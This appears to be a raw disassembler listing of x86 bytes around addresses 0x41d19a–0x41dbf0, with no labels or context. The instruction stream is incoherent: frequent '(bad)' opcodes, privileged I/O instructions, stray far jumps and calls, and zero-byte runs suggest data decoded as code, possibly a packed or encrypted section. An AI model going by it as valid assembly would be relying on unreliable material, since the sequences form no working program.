  41d19a:	xor    DWORD PTR [edx],0xe44be16c
  41d1a0:	xchg   BYTE PTR [ebx-0x7f],bh
  41d1a3:	sbb    edi,0xb4df2463
  41d1a9:	hlt    
  41d1aa:	dec    esp
  41d1ab:	jmp    0x41d1f1
  41d1ad:	in     al,0xa6
  41d1af:	mov    bl,dl
  41d1b1:	inc    esp
  41d1b2:	cli    
  41d1b3:	or     esp,DWORD PTR [esp+esi*4+0x5f]
  41d1b7:	or     eax,0xd2ba657b
  41d1bc:	jns    0x41d1c9
  41d1be:	mov    edi,0x3264
	...
  41d233:	add    bl,dh
  41d235:	and    ebp,ecx
  41d237:	push   ebp
  41d238:	(bad)  
  41d23a:	sti    
  41d23b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d23c:	pop    edi
  41d23d:	push   edx
  41d23e:	jo     0x41d1ff
  41d240:	lds    edi,FWORD PTR [esi]
  41d242:	xor    dh,dh
  41d244:	les    edi,FWORD PTR [ecx]
  41d246:	add    DWORD PTR [eax],eax
  41d248:	cmc    
  41d249:	add    BYTE PTR [eax],al
  41d24b:	add    BYTE PTR [ebx],bl
  41d24d:	mov    ds:0x5fb11c9b,eax
  41d252:	cdq    
  41d253:	sbb    al,0xae
  41d255:	ins    BYTE PTR es:[edi],dx
  41d256:	repz dec ebp
  41d258:	and    ebx,DWORD PTR [edx+edx*4]
  41d25b:	fdivp  st(3),st
  41d25d:	mov    eax,0xcc480957
  41d262:	iret   
  41d263:	retf   0x9f6
  41d266:	enter  0x729,0x76
  41d26a:	cwde   
  41d26b:	lahf   
  41d26c:	je     0x41d2a5
  41d26e:	jecxz  0x41d25c
  41d270:	xchg   edx,eax
  41d271:	lods   al,BYTE PTR ds:[esi]
  41d272:	fcmovne st,st(4)
  41d274:	inc    edx
  41d275:	jmp    0x41d2ba
  41d277:	(bad)  
  41d278:	adc    al,0x72
  41d27a:	jbe    0x41d1fe
  41d27c:	les    esp,FWORD PTR [ecx]
  41d27e:	pop    ss
  41d27f:	sbb    cl,al
  41d281:	(bad)  
  41d282:	jecxz  0x41d248
  41d284:	push   esi
  41d285:	fsubr  DWORD PTR [ebx-0x7af8a99]
  41d28b:	std    
  41d28c:	std    
  41d28d:	loope  0x41d271
  41d28f:	arpl   WORD PTR [edi+0x1b],dx
  41d292:	js     0x41d268
  41d294:	icebp  
  41d295:	xor    al,0x23
  41d297:	add    eax,0x686eb189
  41d29c:	outs   dx,BYTE PTR ds:[esi]
  41d29d:	mov    BYTE PTR [eax+0x38],0xec
  41d2a1:	call   0xbe86:0xa0b458a
  41d2a8:	xor    al,BYTE PTR [eax]
  41d2aa:	push   cs
  41d2ab:	sub    eax,0x35029e16
  41d2b0:	mov    ebx,DWORD PTR [edx+0x1c15c190]
  41d2b6:	scas   al,BYTE PTR es:[edi]
  41d2b7:	lds    ebp,FWORD PTR [esi+edi*2+0x3e]
  41d2bb:	xchg   ebx,eax
  41d2bc:	jno    0x41d270
  41d2be:	repz push ecx
  41d2c0:	bound  ecx,QWORD PTR [edi-0x7f]
  41d2c3:	in     al,0x5
  41d2c5:	out    0x95,al
  41d2c7:	mov    ebx,ss
  41d2c9:	loopne 0x41d288
  41d2cb:	push   ebx
  41d2cc:	xlat   BYTE PTR ds:[ebx]
  41d2cd:	jmp    0x41d250
  41d2cf:	jmp    0x312ab764
  41d2d4:	sub    eax,0x60930d53
  41d2d9:	scas   al,BYTE PTR es:[edi]
  41d2da:	mov    al,0x1b
  41d2dc:	pop    eax
  41d2dd:	sar    DWORD PTR [ebp-0x20a9cd9c],1
  41d2e3:	dec    ebx
  41d2e4:	sub    DWORD PTR [ebx+0x50],0xffffffa6
  41d2e8:	pop    ss
  41d2e9:	ret    
  41d2ea:	cld    
  41d2eb:	xchg   edx,eax
  41d2ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d2ed:	lea    ebx,ds:0xc1a40b8f
  41d2f3:	inc    eax
  41d2f4:	sbb    BYTE PTR [ecx-0x31f9e7a9],cl
  41d2fa:	fs pop ebx
  41d2fc:	in     eax,dx
  41d2fd:	mov    ecx,0x4b2a75b8
  41d302:	dec    esi
  41d303:	jge    0x41d324
  41d305:	jmp    0xa1e8581e
  41d30a:	pushf  
  41d30b:	xchg   dh,dh
  41d30d:	popa   
  41d30e:	aam    0x58
  41d310:	daa    
  41d311:	rcl    BYTE PTR [ecx-0x5b58797b],1
  41d317:	add    esi,DWORD PTR [ecx+edx*1-0x69]
  41d31b:	pop    ebx
  41d31c:	mov    ss,WORD PTR [edi+0x521a0023]
  41d322:	in     al,dx
  41d323:	retf   
  41d324:	inc    DWORD PTR [edx-0x186feb6d]
  41d32a:	pop    ecx
  41d32b:	dec    edi
  41d32c:	cmp    al,0x61
  41d32e:	aaa    
  41d32f:	mov    eax,0xd32b1ba3
  41d334:	jg     0x41d2fd
  41d336:	xchg   ecx,eax
  41d337:	(bad)  
  41d338:	sub    ch,ch
  41d33a:	xchg   ecx,eax
  41d33b:	test   eax,0x12be5453
  41d340:	data16 add BYTE PTR [eax],al
	...
  41d3b3:	add    BYTE PTR [ebx+0x20],dl
  41d3b6:	mov    al,ds:0x5faef3ae
  41d3bb:	std    
  41d3bc:	cmp    eax,0x4c
  41d3bf:	mov    al,0xa6
  41d3c2:	es inc esi
  41d3c4:	mov    ecx,0xf500013a
  41d3c9:	add    BYTE PTR [eax],al
  41d3cb:	add    ch,bl
  41d3cd:	in     eax,0x8c
  41d3cf:	in     eax,0x1
  41d3d1:	adc    al,0x86
  41d3d3:	scas   al,BYTE PTR es:[edi]
  41d3d4:	push   esp
  41d3d5:	mov    ah,0x54
  41d3d7:	es and eax,0x7f6e954d
  41d3dd:	fs pop edi
  41d3df:	sbb    DWORD PTR ds:[eax-0xcda5669],esi
  41d3e6:	push   ds
  41d3e7:	lock neg DWORD PTR [esi]
  41d3ea:	inc    BYTE PTR [edi]
  41d3ec:	inc    esp
  41d3ed:	cmp    ebp,DWORD PTR ds:0x23a59bc9
  41d3f3:	xor    DWORD PTR [edx],eax
  41d3f5:	(bad)  
  41d3f6:	jl     0x41d446
  41d3f8:	mov    ch,BYTE PTR [edx+esi*4+0x40]
  41d3fc:	push   cs
  41d3fd:	aas    
  41d3fe:	nop
  41d3ff:	and    BYTE PTR [edx],dh
  41d401:	je     0x41d3cd
  41d403:	and    al,0x99
  41d405:	pop    ebp
  41d406:	rcr    DWORD PTR [esi-0x75],1
  41d409:	stos   DWORD PTR es:[edi],eax
  41d40a:	push   edi
  41d40b:	imul   ebx,DWORD PTR [eax],0x7a6ddfba
  41d411:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d412:	cmp    DWORD PTR [eax+0x17],edx
  41d415:	scas   eax,DWORD PTR es:[edi]
  41d416:	inc    ecx
  41d417:	ficom  WORD PTR [edx+0x65]
  41d41a:	popa   
  41d41b:	dec    edx
  41d41c:	push   ebp
  41d41d:	test   ebx,edi
  41d41f:	or     cl,dl
  41d421:	fstp   DWORD PTR [ecx]
  41d423:	sub    DWORD PTR [edx-0x5ab68e84],ebx
  41d429:	xor    ecx,DWORD PTR [ebx]
  41d42b:	fdivrp st(1),st
  41d42d:	dec    edx
  41d42e:	mov    esi,0x9f7c9e5c
  41d433:	retf   
  41d434:	jnp    0x41d3cf
  41d436:	pushf  
  41d437:	mov    dh,0x7e
  41d439:	sub    BYTE PTR [eax],ch
  41d43b:	push   0x8a369140
  41d440:	and    BYTE PTR [eax+eax*4+0x42387464],0x31
  41d448:	mov    ah,0x6a
  41d44a:	outs   dx,DWORD PTR ds:[esi]
  41d44b:	fmul   DWORD PTR [eax+0x29]
  41d44e:	mov    ch,0x4f
  41d450:	jg     0x41d49d
  41d452:	cmp    eax,0xb2e5181f
  41d457:	or     al,0xe9
  41d459:	adc    DWORD PTR [ecx+0x1eed2f78],edx
  41d45f:	mov    DWORD PTR [esi+eiz*4-0x7f597bd4],eax
  41d466:	(bad)  
  41d467:	imul   ebp,DWORD PTR [edx-0x5dbbf5c2],0x4bbae6fc
  41d471:	sbb    DWORD PTR [eax+0x45b2fa8c],esi
  41d477:	aas    
  41d478:	and    bh,BYTE PTR [esp+eiz*4+0x79ac1fca]
  41d47f:	loope  0x41d4d6
  41d481:	mov    ds:0x96d56993,eax
  41d486:	jg     0x41d449
  41d488:	push   0x75ebb15b
  41d48d:	mov    ebx,0x930bb740
  41d492:	xor    al,0x55
  41d494:	jge    0x41d42a
  41d496:	dec    edi
  41d497:	pop    esp
  41d498:	lods   al,BYTE PTR ds:[esi]
  41d499:	mov    bh,0x3
  41d49b:	cmp    dh,BYTE PTR [ebp+0x42]
  41d49e:	xchg   edi,eax
  41d49f:	cmp    bh,BYTE PTR [eax+0x2a795d8d]
  41d4a5:	aam    0x3e
  41d4a7:	push   cs
  41d4a8:	outs   dx,BYTE PTR ds:[esi]
  41d4a9:	mov    bl,0xe0
  41d4ab:	dec    esi
  41d4ac:	mov    esp,0x3fb47cf
  41d4b1:	mov    WORD PTR [edi],ds
  41d4b3:	cld    
  41d4b4:	dec    ebp
  41d4b5:	dec    esp
  41d4b6:	sub    DWORD PTR [ecx-0x79],esi
  41d4b9:	mov    bh,0xba
  41d4bb:	inc    esi
  41d4bc:	popf   
  41d4bd:	jg     0x41d520
  41d4bf:	push   esp
  41d4c0:	lods   al,BYTE PTR ds:[esi]
	...
  41d531:	add    BYTE PTR [eax],al
  41d533:	add    ch,al
  41d535:	and    edx,DWORD PTR [ecx-0xa4808db]
  41d53b:	jecxz  0x41d58e
  41d53d:	or     edi,DWORD PTR [edx+ecx*8-0x598c1960]
  41d544:	scas   al,BYTE PTR es:[edi]
  41d545:	cmp    eax,DWORD PTR [ecx]
  41d547:	add    ch,dh
  41d549:	add    BYTE PTR [eax],al
  41d54b:	add    BYTE PTR [edi+edi*8],al
  41d54e:	mov    ds,ebp
  41d550:	stos   BYTE PTR es:[edi],al
  41d551:	xchg   esi,eax
  41d552:	aaa    
  41d553:	inc    esi
  41d554:	sbb    esp,ebp
  41d556:	xchg   edi,eax
  41d557:	dec    BYTE PTR [esi]
  41d559:	imul   ebx,DWORD PTR ds:0xc04e55c0,0xbaa95afc
  41d563:	dec    ebx
  41d564:	sub    ecx,DWORD PTR [edx+edx*4+0x32b9d912]
  41d56b:	xchg   esi,eax
  41d56c:	adc    BYTE PTR [eax-0x48],cl
  41d56f:	popf   
  41d570:	jbe    0x41d5a8
  41d572:	js     0x41d537
  41d574:	xchg   edi,eax
  41d575:	mov    ch,0x9b
  41d577:	fidivr WORD PTR [esi-0x1b29159a]
  41d57d:	bound  ebp,QWORD PTR [esi-0x20d7e930]
  41d583:	and    eax,0xa330a1ea
  41d588:	cmp    esi,DWORD PTR [ebx+0x4617fbaf]
  41d58e:	pop    ds
  41d58f:	cmp    DWORD PTR [ecx+0x61],0x19
  41d593:	inc    esi
  41d594:	dec    ecx
  41d595:	push   es
  41d596:	dec    edx
  41d597:	push   esi
  41d598:	xchg   BYTE PTR [esi-0x46],dl
  41d59b:	ins    DWORD PTR es:[edi],dx
  41d59c:	fwait
  41d59d:	(bad)  
  41d59e:	mov    eax,0x20c7666f
  41d5a3:	mov    esi,0xacce6c51
  41d5a8:	nop
  41d5a9:	mov    edx,0xa13880d8
  41d5ae:	inc    eax
  41d5af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d5b0:	imul   ebx,eax,0xfffffffe
  41d5b3:	jns    0x41d540
  41d5b5:	adc    eax,0x7fdd054e
  41d5ba:	jle    0x41d543
  41d5bc:	aaa    
  41d5bd:	dec    esp
  41d5be:	dec    ebp
  41d5bf:	cmp    BYTE PTR [ebx+0x50f4e29c],0x13
  41d5c6:	sar    BYTE PTR [ebx+0x5b],cl
  41d5c9:	or     eax,0x5827aede
  41d5ce:	pop    esp
  41d5cf:	sub    eax,0x8d3f85fd
  41d5d4:	fiadd  DWORD PTR [ecx+0x7f5918bc]
  41d5da:	not    bl
  41d5dc:	xchg   esp,eax
  41d5dd:	sub    bh,BYTE PTR [edi-0x4a]
  41d5e0:	add    eax,0xde6ae098
  41d5e5:	sub    BYTE PTR [esi-0x56],0x7f
  41d5e9:	xor    eax,0x66ff278
  41d5ee:	retf   
  41d5ef:	push   0xffffffba
  41d5f1:	cmp    al,0x56
  41d5f3:	scas   al,BYTE PTR es:[edi]
  41d5f4:	addr16 mov ds:0xf1eb,eax
  41d5f8:	adc    BYTE PTR [ebx+ebp*4-0x61],dl
  41d5fc:	adc    al,0x3a
  41d5fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d5ff:	cmp    al,0xbe
  41d601:	sahf   
  41d602:	mov    cs,WORD PTR [esi+0x327f7abc]
  41d608:	inc    ebp
  41d609:	push   esp
  41d60a:	add    DWORD PTR [ebp-0x48],edi
  41d60d:	jb     0x41d5b5
  41d60f:	jecxz  0x41d63d
  41d611:	adc    al,ch
  41d613:	jl     0x41d5a2
  41d615:	push   cs
  41d616:	call   0xc35fe42e
  41d61b:	fcmovu st,st(5)
  41d61d:	shl    cl,1
  41d61f:	xchg   ebp,eax
  41d620:	inc    eax
  41d621:	adc    ah,BYTE PTR [esi*8+0x7fee6fc3]
  41d628:	mov    eax,ds:0xb4b71234
  41d62d:	(bad)  
  41d62e:	mov    edx,0x3d9029d6
  41d633:	sbb    DWORD PTR [ecx-0x75],ebp
  41d636:	and    bl,BYTE PTR [edx+0x7fdea92a]
  41d63c:	pop    DWORD PTR [edi]
  41d63e:	lds    eax,FWORD PTR [ecx-0x6e]
	...
  41d6b1:	add    BYTE PTR [eax],al
  41d6b3:	add    dl,bl
  41d6b5:	add    edx,eax
  41d6b7:	xchg   bl,bl
  41d6b9:	(bad)  
  41d6ba:	ficomp WORD PTR [ebp+0x8]
  41d6bd:	push   0xc7940a3b
  41d6c2:	sbb    eax,0x13ca35d
  41d6c7:	add    ch,dh
  41d6c9:	add    BYTE PTR [eax],al
  41d6cb:	add    bl,dh
  41d6cd:	sbb    esi,esi
  41d6cf:	ins    DWORD PTR es:[edi],dx
  41d6d0:	add    ebx,ecx
  41d6d2:	adc    ah,ah
  41d6d4:	ret    0x135
  41d6d7:	push   eax
  41d6d8:	and    dh,0xda
  41d6db:	push   edi
  41d6dc:	shr    BYTE PTR [eax+esi*2+0x39],1
  41d6e0:	rep lods eax,DWORD PTR ds:[esi]
  41d6e2:	hlt    
  41d6e3:	sahf   
  41d6e4:	call   0x51671f79
  41d6e9:	addr16 jb 0x41d6cb
  41d6ec:	mov    cl,0x86
  41d6ee:	add    eax,0x60806211
  41d6f3:	into   
  41d6f4:	xchg   esp,eax
  41d6f5:	jmp    0xb0126052
  41d6fa:	(bad)  
  41d6fc:	pop    ebp
  41d6fd:	xchg   ebp,eax
  41d6fe:	fild   DWORD PTR [ebx]
  41d700:	sbb    dl,BYTE PTR [esi+0x40]
  41d703:	in     eax,dx
  41d704:	jns    0x41d75f
  41d706:	retf   0x2dca
  41d709:	(bad)  
  41d70a:	out    dx,eax
  41d70b:	pop    ecx
  41d70c:	xor    dh,dl
  41d70e:	mov    BYTE PTR [ebp+0xf],ah
  41d711:	test   DWORD PTR [edi],0x3d3de29a
  41d717:	jg     0x41d6b3
  41d719:	pmuludq mm7,mm2
  41d71c:	fwait
  41d71d:	in     eax,0x8
  41d71f:	xchg   edi,eax
  41d720:	les    ebp,FWORD PTR [esp+edx*8-0x4]
  41d724:	xchg   ebx,eax
  41d725:	sbb    BYTE PTR [ebp+0x1694be95],0x47
  41d72c:	sti    
  41d72d:	sti    
  41d72e:	(bad)  [ecx]
  41d730:	sbb    ecx,DWORD PTR [edi+edi*4+0x20a88516]
  41d737:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d738:	das    
  41d739:	mov    dl,0x2e
  41d73b:	fiadd  DWORD PTR [esi-0x2a]
  41d73e:	mov    ebx,0x8dcae25
  41d743:	xor    eax,0x7cff3b84
  41d748:	clc    
  41d749:	ds jb  0x41d7b1
  41d74c:	outs   dx,DWORD PTR ds:[esi]
  41d74d:	jb     0x41d6d9
  41d74f:	mov    cl,0xb4
  41d751:	sbb    edx,DWORD PTR [ebp-0x34cca07f]
  41d757:	stos   DWORD PTR es:[edi],eax
  41d758:	cmp    BYTE PTR [esi+ebx*2+0x3e],0xfc
  41d75d:	call   0x27fc:0xd5bd817f
  41d764:	push   esi
  41d765:	ficom  WORD PTR [ecx+0x6e]
  41d768:	scas   eax,DWORD PTR es:[edi]
  41d769:	jp     0x41d78b
  41d76b:	pop    esp
  41d76c:	pop    esp
  41d76d:	fistp  WORD PTR [edx-0x46]
  41d770:	out    0x55,al
  41d772:	cmp    eax,0xf9208f5e
  41d777:	rcr    DWORD PTR [ecx-0x29cbff],cl
  41d77d:	adc    cl,BYTE PTR [ebx+0x31]
  41d780:	cmp    BYTE PTR [edx+0x3cebd718],bh
  41d786:	and    BYTE PTR [ecx],dl
  41d788:	lds    edx,FWORD PTR [edx-0x3171efbe]
  41d78e:	mov    bl,0x19
  41d790:	fisubr DWORD PTR [esi-0x7e]
  41d793:	das    
  41d794:	mov    bl,0x96
  41d796:	adc    al,0x29
  41d798:	cwde   
  41d799:	dec    eax
  41d79a:	shl    DWORD PTR [edi],1
  41d79c:	arpl   WORD PTR [edi-0x7e],di
  41d79f:	hlt    
  41d7a0:	test   al,0xe5
  41d7a2:	adc    esp,esp
  41d7a4:	bound  ebp,QWORD PTR [ebx+0x3e]
  41d7a7:	inc    ebx
  41d7a8:	je     0x41d77e
  41d7aa:	inc    esi
  41d7ab:	clc    
  41d7ac:	jo     0x41d805
  41d7ae:	push   0x74
  41d7b0:	stos   DWORD PTR es:[edi],eax
  41d7b1:	js     0x41d7a8
  41d7b3:	adc    DWORD PTR [ebp+0x27],ebp
  41d7b6:	push   edi
  41d7b7:	xor    edx,0xffffff82
  41d7ba:	test   al,0x66
  41d7bc:	xchg   edx,eax
  41d7bd:	ror    cl,cl
  41d7bf:	push   esp
  41d7c0:	sub    eax,DWORD PTR [eax]
	...
  41d832:	add    BYTE PTR [eax],al
  41d834:	arpl   WORD PTR [ebp*4-0x44200cc],si
  41d83b:	ja     0x41d7c4
  41d83d:	repnz pop es
  41d83f:	add    esp,DWORD PTR [ebp-0x9]
  41d842:	aad    0x5d
  41d844:	cwde   
  41d845:	cmp    eax,0xf50001
  41d84a:	add    BYTE PTR [eax],al
  41d84c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d84d:	push   0x8d93f3e5
  41d852:	jne    0x41d888
  41d854:	mov    esi,DWORD PTR [ebp+0x7]
  41d857:	or     BYTE PTR [esi],0x5
  41d85a:	(bad)  
  41d85b:	xlat   BYTE PTR ds:[ebx]
  41d85c:	or     ecx,ecx
  41d85e:	cmp    BYTE PTR cs:[eax+0x62a57d5c],ch
  41d865:	std    
  41d866:	fwait
  41d867:	cdq    
  41d868:	inc    edx
  41d869:	xchg   ebp,eax
  41d86a:	in     eax,0x65
  41d86c:	ret    0xd48e
  41d86f:	cdq    
  41d870:	sbb    bl,al
  41d872:	retf   0x3502
  41d875:	bound  ebp,QWORD PTR [eax-0x7c679574]
  41d87b:	pop    edi
  41d87c:	enter  0xdde7,0xb
  41d880:	data16 mov bh,0x32
  41d883:	and    al,0x28
  41d885:	jae    0x41d8d2
  41d887:	sbb    DWORD PTR [eax],ebp
  41d889:	or     al,0x67
  41d88b:	stos   DWORD PTR es:[edi],eax
  41d88c:	add    BYTE PTR [ebx+0x6cf9e87d],dh
  41d892:	add    al,0x74
  41d894:	out    0xd4,al
  41d896:	dec    edi
  41d897:	mov    esi,0x44118ec2
  41d89c:	aaa    
  41d89d:	or     BYTE PTR [ecx+0x44],0x1d
  41d8a1:	mov    bh,0x3d
  41d8a3:	retf   
  41d8a4:	(bad)  
  41d8a5:	jmp    0x159feff2
  41d8aa:	(bad)  
  41d8ab:	pop    edx
  41d8ac:	imul   BYTE PTR [eax+ecx*2-0x72]
  41d8b0:	add    edi,DWORD PTR [eax+0x549dcece]
  41d8b6:	cmp    esp,esi
  41d8b8:	xchg   ecx,esp
  41d8ba:	add    edi,DWORD PTR [ebx]
  41d8bc:	push   ecx
  41d8bd:	fidiv  DWORD PTR [esi+0x478ba510]
  41d8c3:	push   edx
  41d8c4:	call   0xf6c6:0x38e3e92
  41d8cb:	imul   edi,DWORD PTR [ecx],0x2c
  41d8ce:	mov    gs,edx
  41d8d0:	loopne 0x41d87d
  41d8d2:	jmp    0x953d:0x69e4d3e
  41d8d9:	fcomp  QWORD PTR [ebx-0xe38c9d7]
  41d8df:	adc    ebx,DWORD PTR [esi]
  41d8e1:	sbb    DWORD PTR [edi],esp
  41d8e3:	sub    al,0xb9
  41d8e5:	push   cs
  41d8e6:	jbe    0x41d908
  41d8e8:	pop    ecx
  41d8e9:	clc    
  41d8ea:	adc    eax,0x261c1c25
  41d8ef:	adc    esp,edx
  41d8f1:	pop    es
  41d8f2:	sbb    ch,BYTE PTR [eax+0x64ed62dd]
  41d8f8:	push   0x8b78f253
  41d8fd:	mov    edx,0x456d9934
  41d902:	jo     0x41d92f
  41d904:	fild   WORD PTR [ebx]
  41d906:	in     al,0xa6
  41d908:	nop
  41d909:	pop    ebx
  41d90a:	inc    edi
  41d90b:	cdq    
  41d90c:	in     al,0xba
  41d90e:	icebp  
  41d90f:	pop    es
  41d910:	je     0x41d938
  41d912:	cmp    al,0x10
  41d914:	xchg   ebp,eax
  41d915:	xor    al,0x9d
  41d917:	push   0xffffffad
  41d919:	add    eax,0x30469db4
  41d91e:	fnstenv [ebx-0x7e]
  41d921:	stos   DWORD PTR es:[edi],eax
  41d922:	sbb    ecx,eax
  41d924:	out    dx,eax
  41d925:	mov    dl,0x88
  41d927:	das    
  41d928:	mov    dh,0xee
  41d92a:	xchg   edx,edx
  41d92c:	cli    
  41d92d:	dec    ecx
  41d92e:	add    BYTE PTR [edx+0x3e],bl
  41d931:	pop    esp
  41d932:	repnz inc edi
  41d934:	dec    esp
  41d935:	jb     0x41d8c7
  41d937:	and    DWORD PTR [ecx-0x4],edi
  41d93a:	dec    esp
  41d93b:	ins    WORD PTR es:[di],dx
  41d93e:	push   esp
  41d93f:	ss loope 0x41d942
	...
  41d9b2:	add    BYTE PTR [eax],al
  41d9b4:	lock retf 0xfc94
  41d9b8:	mov    esi,0xfdcef8fe
  41d9bd:	cwde   
  41d9be:	sbb    eax,0x49dff11c
  41d9c3:	fisttp WORD PTR [ebp-0xafffec2]
  41d9c9:	add    BYTE PTR [eax],al
  41d9cb:	add    BYTE PTR [ecx],bl
  41d9cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d9ce:	xor    esi,DWORD PTR [esi-0x47]
  41d9d1:	dec    esi
  41d9d2:	adc    al,BYTE PTR [edx]
  41d9d4:	pushf  
  41d9d5:	in     al,dx
  41d9d6:	pop    edx
  41d9d7:	scas   al,BYTE PTR es:[edi]
  41d9d8:	jne    0x41d989
  41d9da:	(bad)  
  41d9db:	in     eax,dx
  41d9dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d9dd:	jo     0x41da4e
  41d9df:	mov    eax,ds:0x33427e80
  41d9e4:	mov    edx,0x917f13b1
  41d9e9:	pop    esp
  41d9ea:	sub    edi,DWORD PTR [ebx+0x5c6ca843]
  41d9f0:	aad    0xf5
  41d9f2:	xor    BYTE PTR [ebp-0x41],0x6
  41d9f6:	out    dx,al
  41d9f7:	dec    edx
  41d9f8:	es out dx,al
  41d9fa:	push   esp
  41d9fb:	in     al,dx
  41d9fc:	aad    0x56
  41d9fe:	adc    eax,0xed81f76f
  41da03:	jne    0x41da6d
  41da05:	jmp    0xd4ac37bd
  41da0a:	loop   0x41d9f8
  41da0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da0d:	jp     0x41da7a
  41da0f:	add    BYTE PTR [ecx+ebp*8],bl
  41da12:	jb     0x41da04
  41da14:	bound  esi,QWORD PTR [si+0x11]
  41da18:	push   es
  41da19:	jecxz  0x41d9d7
  41da1b:	pop    ebx
  41da1c:	or     DWORD PTR [ecx+0x48],edx
  41da1f:	mov    esp,es
  41da21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da23:	shl    BYTE PTR [ecx-0x5a],0xba
  41da27:	or     cl,ah
  41da29:	mov    esi,0xa022fd68
  41da2e:	je     0x41da96
  41da30:	adc    DWORD PTR [edi+0x46269a7],0xeabc5431
  41da3a:	cmp    bh,BYTE PTR [ebx+0x4663ce83]
  41da40:	jmp    0xa71d:0x85923b0e
  41da47:	dec    si
  41da49:	ror    BYTE PTR [esi],1
  41da4b:	push   cs
  41da4c:	inc    edi
  41da4d:	ja     0x41da39
  41da4f:	push   es
  41da50:	inc    esi
  41da51:	jbe    0x41d9f7
  41da53:	push   ds
  41da54:	jne    0x41da91
  41da56:	xchg   ecx,eax
  41da57:	sub    al,BYTE PTR [ebx]
  41da59:	lea    edi,[edx+ebp*4]
  41da5c:	sub    al,BYTE PTR [edx+eiz*8]
  41da5f:	adc    al,0xc5
  41da61:	jmp    0xcbae:0x737b058f
  41da68:	jae    0x41dac9
  41da6a:	retf   
  41da6b:	imul   edx,DWORD PTR [eax+0x54],0x6a
  41da6f:	mov    ebx,0xb280c68c
  41da74:	test   al,0xc9
  41da76:	stos   BYTE PTR es:[edi],al
  41da77:	std    
  41da78:	aas    
  41da79:	jmp    0xb286:0xc51d87bc
  41da80:	ret    0x3094
  41da83:	imul   edx,DWORD PTR [esi-0x4f],0xd0241ebe
  41da8a:	sbb    dh,bh
  41da8c:	adc    edx,DWORD PTR [eax+0x6bb36ec2]
  41da92:	lods   al,BYTE PTR ds:[esi]
  41da93:	inc    ebp
  41da94:	mov    esi,DWORD PTR [esi]
  41da96:	dec    esp
  41da97:	adc    BYTE PTR ds:0xc101245f,bh
  41da9d:	xchg   DWORD PTR ds:0x9b8f359e,eax
  41daa3:	inc    ebp
  41daa4:	xchg   edi,eax
  41daa5:	out    dx,eax
  41daa6:	faddp  st(2),st
  41daa8:	fldenv [eax]
  41daaa:	sub    edx,DWORD PTR [eax-0x35]
  41daad:	and    eax,0x7884cee5
  41dab2:	add    bl,BYTE PTR [ebp+0x759fe3a7]
  41dab8:	add    esp,DWORD PTR [ebp+0x3d4c2f41]
  41dabe:	repz push es
  41dac0:	outs   dx,BYTE PTR ds:[esi]
	...
  41db31:	add    BYTE PTR [eax],al
  41db33:	add    BYTE PTR [ecx],ch
  41db35:	(bad)  
  41db36:	sti    
  41db37:	pop    ebp
  41db38:	(bad)  
  41db39:	jge    0x41daea
  41db3b:	div    dl
  41db3d:	cmp    ebp,0xb
  41db40:	stc    
  41db41:	(bad)  
  41db42:	out    dx,eax
  41db43:	pop    ds
  41db44:	cmp    BYTE PTR [edi],0x1
  41db47:	add    ch,dh
  41db49:	add    BYTE PTR [eax],al
  41db4b:	add    BYTE PTR [ebx-0x739c87a9],bh
  41db51:	adc    al,ch
  41db53:	push   0x1d
  41db55:	(bad)  
  41db56:	mov    ds:0x3d50b8d4,eax
  41db5b:	mov    ds:0x7ce4244a,al
  41db60:	jae    0x41dbd3
  41db62:	xchg   BYTE PTR [eax+0x166a4de1],al
  41db68:	fdiv   QWORD PTR [ecx]
  41db6a:	xlat   BYTE PTR ds:[ebx]
  41db6b:	out    0xb1,eax
  41db6d:	mov    ah,0xed
  41db6f:	les    ebp,FWORD PTR [edi]
  41db71:	jae    0x41db7e
  41db73:	iret   
  41db74:	(bad)  
  41db76:	shr    DWORD PTR [eax+0x5e923fa8],0xdc
  41db7d:	(bad)  
  41db7e:	cmp    BYTE PTR [edi+0x4c7fa66e],dl
  41db84:	dec    ebx
  41db85:	ret    0x6203
  41db88:	lahf   
  41db89:	cdq    
  41db8a:	lods   al,BYTE PTR ds:[esi]
  41db8b:	xor    BYTE PTR [ecx],bl
  41db8d:	mov    edx,0xfce030ef
  41db92:	inc    esp
  41db93:	jno    0x41db39
  41db95:	dec    esi
  41db96:	and    edx,DWORD PTR [ebx]
  41db98:	lock mov ecx,0x21092e96
  41db9e:	in     al,dx
  41db9f:	xor    al,0xb4
  41dba1:	jge    0x41dbbd
  41dba3:	sub    al,bh
  41dba5:	gs aaa 
  41dba7:	pop    ebp
  41dba8:	clc    
  41dba9:	sub    ah,BYTE PTR [edx-0x52]
  41dbac:	xchg   edx,eax
  41dbad:	add    DWORD PTR [ecx],edx
  41dbaf:	or     BYTE PTR [esi],ch
  41dbb1:	repnz mov cl,0x1
  41dbb4:	aad    0x1f
  41dbb6:	jne    0x41dc27
  41dbb8:	(bad)  
  41dbb9:	shr    DWORD PTR [ecx],cl
  41dbbb:	xor    DWORD PTR [ebx+esi*8-0x16],esi
  41dbbf:	mov    ch,0x82
  41dbc1:	fwait
  41dbc2:	mov    dh,0x4b
  41dbc4:	mov    eax,ds:0xf6548b25
  41dbc9:	pop    ss
  41dbca:	xchg   ecx,eax
  41dbcb:	jle    0x41dbc5
  41dbcd:	aam    0xae
  41dbcf:	push   ecx
  41dbd0:	jne    0x41db81
  41dbd2:	jb     0x41db9d
  41dbd4:	fisubr DWORD PTR [edi]
  41dbd6:	dec    ebp
  41dbd7:	inc    edi
  41dbd8:	mov    eax,ds:0x690d249a
  41dbdd:	aas    
  41dbde:	sub    dl,BYTE PTR [ebx-0x2f]
  41dbe1:	imul   BYTE PTR [eax+eiz*8+0x51]
  41dbe5:	mov    ebx,0x26d5f435
  41dbea:	rol    DWORD PTR [edx+0x41],cl
  41dbed:	push   esi
  41dbee:	leave  
  41dbef:	ret    
  41dbf0:	mov    ebp,0x63735241
